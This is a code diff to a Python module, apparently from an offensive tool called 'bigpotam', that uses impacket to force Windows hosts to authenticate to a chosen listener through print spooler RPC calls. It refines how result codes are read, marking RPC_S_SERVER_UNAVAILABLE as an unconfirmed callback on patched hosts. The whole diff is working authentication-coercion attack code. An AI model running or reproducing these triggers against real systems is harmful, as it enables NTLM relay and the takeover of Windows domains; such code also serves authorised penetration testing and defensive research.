@@ -5,24 +5,36 @@ import logging
 from impacket.dcerpc.v5 import rprn
 from impacket.dcerpc.v5.dtypes import NULL
 
-from bigpotam.methods import check_error
+from bigpotam.methods import UNCONFIRMED, check_error
 from bigpotam.paths import rprn_path
 from bigpotam.structures import RpcRemoteFindFirstPrinterChangeNotification
 
 log = logging.getLogger("bigpotam")
 
 # Result codes of the notification call itself, after RpcOpenPrinter worked.
-# rpc_s_access_denied=0x05, ERROR_BAD_NETPATH=0x35, RPC_S_SERVER_UNAVAILABLE=0x6BA
-_SUCCESS_CODES = {0x00000005, 0x00000035, 0x000006BA}
-_SUCCESS_STRINGS = (
-    "rpc_s_access_denied",
-    "RPC_S_SERVER_UNAVAILABLE",
-    "ERROR_BAD_NETPATH",
-)
+# rpc_s_access_denied=0x05, ERROR_BAD_NETPATH=0x35
+_SUCCESS_CODES = {0x00000005, 0x00000035}
+_SUCCESS_STRINGS = ("rpc_s_access_denied", "ERROR_BAD_NETPATH")
+
+# A patched Win11 24H2 host (October 2026 update, spoolss pipe absent)
+# returned RPC_S_SERVER_UNAVAILABLE over the EPM/TCP path without connecting
+# out, so it no longer proves a callback.
+_UNCONFIRMED_CODES = {0x000006BA}
+_UNCONFIRMED_STRINGS = ("RPC_S_SERVER_UNAVAILABLE",)
 
 
-def _check_success(e):
-    return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)
+def _check_result(name, e):
+    if check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS):
+        return True
+    if check_error(e, _UNCONFIRMED_CODES, _UNCONFIRMED_STRINGS):
+        log.warning(
+            "  %s: call returned RPC_S_SERVER_UNAVAILABLE, callback unconfirmed: "
+            "patched hosts return this without connecting",
+            name,
+        )
+        return UNCONFIRMED
+    log.debug("%s: %s", name, e)
+    return False
 
 
 def _open_printer(dce, target, name):
@@ -55,10 +67,7 @@ def trigger_rprn_notification(dce, listener, listener_port=445, target=None, **k
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("RpcRemoteFindFirstPrinterChangeNotification: %s", e)
-        return False
+        return _check_result("RpcRemoteFindFirstPrinterChangeNotification", e)
 
 
 def trigger_rprn_notification_ex(dce, listener, listener_port=445, target=None, **kw):
@@ -77,10 +86,7 @@ def trigger_rprn_notification_ex(dce, listener, listener_port=445, target=None, 
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("RpcRemoteFindFirstPrinterChangeNotificationEx: %s", e)
-        return False
+        return _check_result("RpcRemoteFindFirstPrinterChangeNotificationEx", e)
 
 
 def trigger_par_async_open_printer(dce, listener, listener_port=445, **kw):
@@ -108,7 +114,4 @@ def trigger_par_async_open_printer(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("RpcAsyncOpenPrinter: %s", e)
-        return False
+        return _check_result("RpcAsyncOpenPrinter", e)
